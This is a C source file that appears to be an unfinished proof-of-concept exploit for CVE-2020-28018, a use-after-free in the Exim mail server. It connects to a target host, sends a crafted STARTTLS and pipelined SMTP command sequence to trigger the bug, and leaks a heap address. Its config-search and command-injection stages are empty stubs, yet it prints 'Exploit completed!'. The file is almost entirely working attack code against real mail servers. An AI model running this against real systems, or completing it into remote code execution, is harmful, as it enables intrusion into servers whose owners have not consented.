/*

    CVE-2020-28018 PoC: Exim Use-After-Free leading to Remote Code Execution

	- @lockedbyte -
	

      --- STILL NOT FINISHED ---

*/


#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <malloc.h>
#include <string.h>
#include <time.h>
#include <sys/socket.h>
#include <resolv.h>
#include <netdb.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

/* -- START EXP CONFIG -- */

#define PIPLN_ITER 0x9
#define POST_PIPLN_ITER 0x2
#define BASE_OFF 0x2ad90

/* -- END EXP CONFIG */

/* -- START EXP SETTINGS -- */

unsigned int output_level = 0;

#ifndef DEBUG
	#define DEBUG 0
#endif

#ifndef DELAY_TIME
	#define DELAY_TIME 0.5
#endif

/*-- END EXP SETTINGS -- */

#ifndef FAIL
	#define FAIL -1
#endif

#ifndef HEXDUMP_COLS
	#define HEXDUMP_COLS 16
#endif

#ifndef MAX_HOST
	#define MAX_HOST 4096
#endif

#ifndef MAX_PIPLN_SZ
	#define MAX_PIPLN_SZ 1024*1024
#endif

#ifndef MAX_POST_PIPLN_SZ
	#define MAX_POST_PIPLN_SZ 1024*1024
#endif


enum CONN_T {
		CLEARTEXT_T,
		TLS_T
             };

SSL_CTX *ctx = NULL;
unsigned int leak_flg = 0;
char target_hostn[MAX_HOST];
unsigned long heap_base = NULL;

/* --- START COMMANDS --- */

#define EHLO_CMD "EHLO pwner\n"
#define STARTTLS_CMD "STARTTLS\n"
#define PIPLN_02_CMD "OP\n"

/* --- END COMMANDS --- */


/* --- START CONN-RELATED FUNCTIONS --- */

int remote_conn(const char *hostname, int port) {
    int sd = 0;
    struct hostent *host = NULL;
    struct sockaddr_in addr;
    if((host = gethostbyname(hostname)) == NULL) {
        puts("[-] Something went wrong resolving target hostname");
        exit(1);
    }
    sd = socket(PF_INET, SOCK_STREAM, 0);
    bzero(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = *(long*)(host->h_addr);
    if(connect(sd, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        close(sd);
	puts("[-] Something went wrong connecting to target");
	exit(1);
    }
    return sd;
}

SSL_CTX *init_ctx_x(void) {
    SSL_METHOD *method = NULL;
    SSL_CTX *ctx = NULL;
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
    method = TLSv1_2_client_method();
    ctx = SSL_CTX_new(method);
    if (ctx == NULL) {
        puts("[-] Something went wrong in init_ctx_x()");
        exit(1);
    }
    return ctx;
}

SSL *initialize_enc_channel(int fd) {
	SSL *ssl = NULL;
	SSL_library_init();
	ctx = init_ctx_x();
	ssl = SSL_new(ctx);
	SSL_set_fd(ssl, fd);
	if(SSL_connect(ssl) == FAIL) {
		puts("[-] Something went wrong initializing encrypted channel");
		exit(1);
	}
	return ssl;
}

void show_certs(SSL* ssl) {
    X509 *cert = NULL;
    char *line = NULL;
    cert = SSL_get_peer_certificate(ssl);
    if (cert != NULL) {
        printf("[+] Server certificates:\n");
        line = X509_NAME_oneline(X509_get_subject_name(cert), 0, 0);
        printf("\t[i] Subject: %s\n", line);
        if(line)
        	free(line);
        line = X509_NAME_oneline(X509_get_issuer_name(cert), 0, 0);
        printf("\t[i] Issuer: %s\n", line);
        if(line) {
        	free(line);
        	line = NULL;
        }
        if(cert) {
        	X509_free(cert);
        	cert = NULL;
        }
    } else
        puts("[i] No client certificates configured");
    return;
}

void close_tls_channel(SSL *ssl) {
	SSL_shutdown(ssl);
	SSL_free(ssl);
	return;
}


int send_data(long fd, char *buf, size_t size, int method_t) {
	int ret = 0;
	switch(method_t) {
		case CLEARTEXT_T:
			ret = write(fd, buf, size);
			break;
		case TLS_T:
			ret = SSL_write((SSL *)fd, buf, size);
			break;
		default:
			puts("[-] Unknown error ocurred.");
			exit(1);
	}
	return ret;
}

int recv_data(long fd, char *buf, size_t size, int method_t) {
	int ret = 0;
	switch(method_t) {
		case CLEARTEXT_T:
			ret = read(fd, buf, size);
			break;
		case TLS_T:
			ret = SSL_read((SSL *)fd, buf, size);
			break;
		default:
			puts("[-] Unknown error ocurred.");
			exit(1);
	}
	return ret;
}

void exchange_data(long fd, char *buf, size_t size, int send_flg, int recv_flg, int method_t) {
	if(send_flg) {
	        #if DEBUG
	        	printf("[DEBUG] Sending: %s\n", buf);
	        #endif
		send_data(fd, buf, strlen(buf), method_t);
	}
	sleep(DELAY_TIME);
	if(recv_flg) {
		recv_data(fd, buf, size, method_t);
		buf[size-1] = '\0';
		#if DEBUG
			printf("%s", buf);
		#endif
		if(leak_flg) {
			puts("\n[+] Memory leak: ");
			hexdump(buf, size/16);
			puts("");
			identify_leak(buf, size);
		}
	}
	sleep(DELAY_TIME);
	return;
}

/* --- END CONN-RELATED FUNCTIONS --- */


void retrieve_host(char *hostname, int port) {
	
}

void hexdump(void *mem, unsigned int len) {
        unsigned int i = 0, j = 0;
        for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) {
                if(i % HEXDUMP_COLS == 0)
                        printf("0x%06x: ", i);
                if(i < len)
                        printf("%02x ", 0xFF & ((char*)mem)[i]);
                else
                        printf("   ");
                if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) {
                        for(j = i - (HEXDUMP_COLS - 1); j <= i; j++) {
                                if(j >= len)
                                        putchar(' ');
                                else if(isprint(((char*)mem)[j]))
                                        putchar(0xFF & ((char*)mem)[j]);       
                                else
                                        putchar('.');
                        }
                        putchar('\n');
                }
        }
}


void reinit_mem(char *buf, size_t size, const char *str) {
	memset(buf, '\0', size);
	strncpy(buf, str, size);
	buf[size-1] = '\0';
	return;
}

void identify_leak(char *buf, size_t size) {
	int i = 0, x = 0;
	uint64_t *leak = NULL;
	int addr_idx = 0;
	char lk[sizeof(uint64_t)];
	
	memset(lk, '\0', sizeof(lk));
	
	while(i < size) {
		if(buf[i++] == 0x55) {
			addr_idx = i+2;
			break;
		}
	}
	
	x = 0;
	while(x < sizeof(uint64_t)) {
		lk[x++] = buf[(addr_idx++)-8];
	}
	
	leak = &lk;
	
	heap_base = *leak - BASE_OFF;
	
	printf("\t[+] Leaked heap address = 0x%lx\n", *leak);
	printf("\t[+] Leaked heap_base = 0x%lx\n", heap_base);
	
	return;
}

int leak_phase(char *hostname, int port) {

	long fd = 0;
	int count = 0;
	int i = 0, x = 0;
	SSL *ssl = NULL;
	char *PIPLN_01_CMD = NULL;
	char *POST_PIPLN = NULL;
	char buf[4096];

	memset(buf, '\0', sizeof(buf));

	PIPLN_01_CMD = calloc(MAX_PIPLN_SZ, sizeof(char));
	POST_PIPLN = calloc(MAX_POST_PIPLN_SZ, sizeof(char));
	
	if(output_level)
		printf("[+] Connecting to %s:%d\n", hostname, port);
	
	fd = remote_conn(hostname, port);
	
	exchange_data(fd, buf, sizeof(buf)-1, 0, 1, CLEARTEXT_T);
	
	if(output_level)
		puts("[*] Sending EHLO...");
		
	reinit_mem(buf, sizeof(buf), EHLO_CMD);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);
	
	if(output_level)
		puts("[*] Initializing an encrypted TLS channel...");
		
	reinit_mem(buf, sizeof(buf), STARTTLS_CMD);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);
	
	ssl = initialize_enc_channel(fd);
	
	if(output_level)
		printf("[+] Initialized encrypted channel with %s:%d (%s)\n", hostname, 	
		                                                        port, 
		                                                   SSL_get_cipher(ssl));
	show_certs(ssl);
	
	if(output_level)
		puts("[*] Sending EHLO...");
		
	reinit_mem(buf, sizeof(buf), EHLO_CMD);
	exchange_data(ssl, buf, sizeof(buf)-1, 1, 1, TLS_T);

	reinit_mem(buf, sizeof(buf), "MAIL FROM: <>\n");
	exchange_data(ssl, buf, sizeof(buf)-1, 1, 1, TLS_T);
	
	if(output_level)
		puts("[*] Sending pipelined command #1...");
	
	i = 0;
	while(i < PIPLN_ITER) {
		strncat(PIPLN_01_CMD, "RCPT TO: postmaster\n", MAX_PIPLN_SZ-1);
		i++;
	}
	strncat(PIPLN_01_CMD, "NO", MAX_PIPLN_SZ-1);

	reinit_mem(buf, sizeof(buf), PIPLN_01_CMD);
	exchange_data(ssl, buf, sizeof(buf)-1, 1, 0, TLS_T);
	
	if(output_level)
		puts("[*] Closing TLS connection channel...");
		
	close_tls_channel(ssl);
	
	ssl = NULL;
	
	if(output_level)
		puts("[*] Sending pipelined command #2...");
		
	reinit_mem(buf, sizeof(buf), PIPLN_02_CMD);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);

	x = 0;
	while(x < POST_PIPLN_ITER) {
		strncat(POST_PIPLN, "RCPT TO: root@localhost\n", MAX_POST_PIPLN_SZ-1);
		x++;
	}
	
	reinit_mem(buf, sizeof(buf), POST_PIPLN);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);
	
	if(output_level)
		puts("[*] Sending EHLO...");
	
	reinit_mem(buf, sizeof(buf), EHLO_CMD);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);
	
	if(output_level)
		puts("[*] Re-initializing an encrypted TLS channel...");
	
	reinit_mem(buf, sizeof(buf), STARTTLS_CMD);
	exchange_data(fd, buf, sizeof(buf)-1, 1, 1, CLEARTEXT_T);
	
	ssl = initialize_enc_channel(fd);
	
	if(output_level)
		printf("[+] Initialized encrypted channel with %s:%d (%s)\n", hostname, 
		                                                            port, 
		                                                         SSL_get_cipher(ssl));
	
	/* not two times right? */	
	//show_certs(ssl);
	
	if(output_level)
		puts("[*] Triggering Use-After-Free...");
	
	leak_flg = 1;
	
	reinit_mem(buf, sizeof(buf), "NOOP\r\n");
	exchange_data(ssl, buf, sizeof(buf)-1, 1, 1, TLS_T);
	
	leak_flg = 0;
	
	if(PIPLN_01_CMD) {
		free(PIPLN_01_CMD);
		PIPLN_01_CMD = NULL;
	}

	if(POST_PIPLN) {
		free(POST_PIPLN);
		POST_PIPLN = NULL;
	}
	
	if(ssl) {
		SSL_free(ssl);
		ssl = NULL;
	}
	if(ctx) {
		SSL_CTX_free(ctx);
		ctx = NULL;
	}
	close(fd);

	return 1;
}

int search_config(char *hostname, int port) {
	return 1;
}

int inject_cmd(char *hostname, int port) {
	return 1;
}

int main(int argc, char *argv[]) {

	int TARGET_PORT = 0;
	char TARGET_HOST[256];
	
	memset(TARGET_HOST, '\0', sizeof(TARGET_HOST));
	memset(target_hostn, '\0', sizeof(target_hostn));
		
	puts("[i] CVE-2020-28018 Proof-Of-Concept (PoC) exploit");

	if(argc < 3) {
		printf("[%%] Usage: %s <target host> <target port>\n", argv[0]);
		exit(0);
	}
	
	snprintf(TARGET_HOST, sizeof(TARGET_HOST)-1, "%s", argv[1]);
	TARGET_PORT = atoi(argv[2]);
	
	/* Will just use "localhost" ATM */
	
	//retrieve_host(TARGET_HOST, TARGET_PORT);
	
	puts("[*] Leaking heap addresses...");
	
	if(!leak_phase(TARGET_HOST, TARGET_PORT)) {
		puts("[-] Something went wrong on memory leak phase");
		exit(0);
	}
	
	if(!search_config(TARGET_HOST, TARGET_PORT)) {
		puts("[-] Something went wrong on config search phase");
		exit(0);
	}

	if(!inject_cmd(TARGET_HOST, TARGET_PORT)) {
		puts("[-] Something went wrong on config corruption phase");
		exit(0);
	}
	
	puts("[+] Exploit completed!");
	
	return 0;
}
